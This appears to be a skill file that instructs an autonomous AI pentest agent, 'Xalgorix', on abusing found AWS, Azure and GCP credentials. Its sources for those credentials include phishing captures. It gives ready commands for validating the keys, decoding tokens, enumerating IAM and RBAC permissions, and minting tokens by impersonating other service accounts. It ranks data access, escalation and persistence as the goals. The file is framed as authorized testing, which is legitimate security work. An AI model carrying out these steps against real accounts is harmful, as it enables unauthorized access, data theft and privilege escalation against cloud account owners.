---
name: cloud-credential-abuse
description: Provider-aware credential abuse — validating found AWS keys/tokens, Azure ARM/Graph/refresh tokens, and GCP service-account credentials, identifying principals, audiences, effective permissions, and escalation paths, transitioning Xalgorix into credentialed cloud attack mode
intent: offensive
assessment_mode:
  - blackbox
  - credentialed
provider:
  - aws
  - azure
  - gcp
---

# Cloud Credential Abuse

## Purpose
Answer: "Xalgorix found a cloud credential/token — what happens next?" Validate it cheaply, identify exactly what it is, expand it into durable identity context, and route to the right escalation path. Invalid credentials are discarded quickly; valid ones become attack-surface state.

## Entry Conditions
- A discovered credential: from file disclosure, metadata chains, JS/config exposure, secret vaults, git history, phishing-captured context, or operator-supplied scope
- Care with handling: record provenance and attributes; use via provider CLIs from the test environment

## Discovery Signals (what a credential looks like)
```text
AWS   : AccessKeyId (AKIA/ASIA...), SecretAccessKey, SessionToken (ASIA = temporary/session),
        ~/.aws/credentials, AWS_* env vars, instance-role JSON
Azure : ARM tokens (aud=management.azure.com), Graph tokens, refresh tokens,
        client secrets (app registrations), certificate credentials, AZURE_* env vars,
        ~/.azure/accessTokens.json, managed-identity tokens
GCP   : service-account JSON (type: service_account, private_key), OAuth access tokens,
        ADC files (~/.config/gcloud/application_default_credentials.json),
        refresh tokens, workload-identity tokens
```

## Methodology

### AWS
```bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
# Output defines everything: account ID, Arn (user vs assumed-role), session context
# Then map the permission surface:
aws iam list-attached-user-policies --user-name <user> 2>/dev/null || \
aws iam list-attached-role-policies --role-name <role>
aws iam simulate-principal-policy --policy-source-arn <arn> --action-names "s3:ListAllMyBuckets" "iam:CreatePolicyVersion"
# Enumerate reachable resources; note AccessDenied GAPS (uncollected permissions hide escalation paths)
```
Determine: user vs assumed role, permission boundaries, SCP constraints (invisible from inside — infer from effective denials), reachable services, resource policies granting cross-account access, and whether keys are root (never use destructive actions on root keys; enumerate only).

### Azure
```bash
# 1. Decode the token (no validation needed): aud, tid, oid, roles, scp
python3 -c "import base64,json,sys; p=sys.argv[1].split('.')[1]; print(json.loads(base64.urlsafe_b64decode(p+'==')))" "<JWT>"
# 2. ARM audience: enumerate the subscription/rbac surface
az login --service-principal -u <appId> -p <secret> --tenant <tid> 2>/dev/null || az login --use-access-token-type ...
az account list && az role assignment list --all
# 3. Graph audience: users, groups, service principals, app roles, consent grants
az rest --url "https://graph.microsoft.com/v1.0/me"
az rest --url "https://graph.microsoft.com/v1.0/servicePrincipals/<oid>/appRoleAssignments"
# 4. Refresh tokens: exchange for new access tokens across resource audiences
```
Determine: tenant, principal type (user vs service principal vs managed identity), token audience coverage, Graph app roles (e.g., `RoleManagement.ReadWrite` = directory role escalation), ARM RBAC roles (Owner/Contributor/User Access Administrator), subscriptions, Key Vault access.

### GCP
```bash
gcloud auth activate-service-account --key-file=<sa.json>
gcloud auth list && gcloud config get-value project
gcloud projects get-iam-policy <project> --flatten="bindings[].members" 2>/dev/null | head -50
# Impersonation check: who can this SA actAs / mint tokens for?
gcloud iam service-accounts get-iam-policy <sa-email>
gcloud auth print-access-token --impersonate-service-account=<target-sa>   # the escalation proof
# Asset inventory: what does the project hold?
gcloud asset list --project=<project> 2>/dev/null || gcloud storage ls
```

## Invalid → Discard Fast
One failed identity call (invalid signature, expired token, disabled key) → mark the credential dead in the ledger and stop retrying. A static permission denial with no recent IAM state change is a real negative — do NOT blind-retry every AccessDenied (IAM eventual consistency matters only in the seconds after a policy/role/credential change you just made or observed).

## Valid → Durable Context
A confirmed identity becomes ledger state: account/tenant/project, principal ARN/OID, permission map, discovered resources. Everything the provider pentest skills need. This is the black-box → credentialed transition.

## Evidence Contract

```text
credential discovered
→ identity API confirms valid (get-caller-identity / token decode + live call / gcloud auth)
→ sensitive resource or escalation-relevant permission demonstrated
→ report with principal, provenance, and the concrete access
```

**NOT evidence**: a credential-shaped string (validate first), a valid identity with zero reachable resources (report as exposure risk only), tool output claiming permissions without a live call

## Common Misses
- Session vs long-term AWS keys conflated (ASIA-prefix expiry — use them immediately)
- Azure audience confusion — testing ARM APIs with a Graph token and calling the credential weak
- GCP default compute SAs (`<number>-compute@developer.gserviceaccount.com`) and App Engine SAs that often still hold `roles/editor`
- Refresh-token value (long-lived Azure OAuth) ignored in favor of expired access tokens
- `sts:GetCallerIdentity` success interpreted as "full account access" — permission enumeration never done
- Credentialed checks missing regions/services (global IAM + per-region resources)

## False Positives / Non-Findings
- Placeholder/test credentials (dead, or scoped to a sandbox account) — validate before reporting impact
- Tokens expired between capture and use
- Service accounts whose projects no longer exist

## Xalgorix Tool Strategy
- `terminal_execute` with aws/az/gcloud as the baseline (no proprietary tooling required)
- Pacu/CloudFox optional accelerators — their output is hypothesis, not proof
- Credential entries in the ledger with provenance, principal, audience, and expiry

## Specialist Handoffs
- AWS escalation → `aws-iam-privilege-escalation`
- Azure escalation → `azure-privilege-escalation`
- GCP escalation → `gcp-iam-privilege-escalation`
- Secrets found via credentials → `cloud-secrets-data-access`
- Trust relationships discovered → `cloud-cross-account-tenant-trust`

## Stopping Rule
Stop when: identity is confirmed, effective privilege surface is mapped well enough to identify high-value paths, and the highest-value paths have been verified or exhausted. Prioritize: direct data access → escalation → persistence. Never enumerate every service in every region when a strong path is already proven.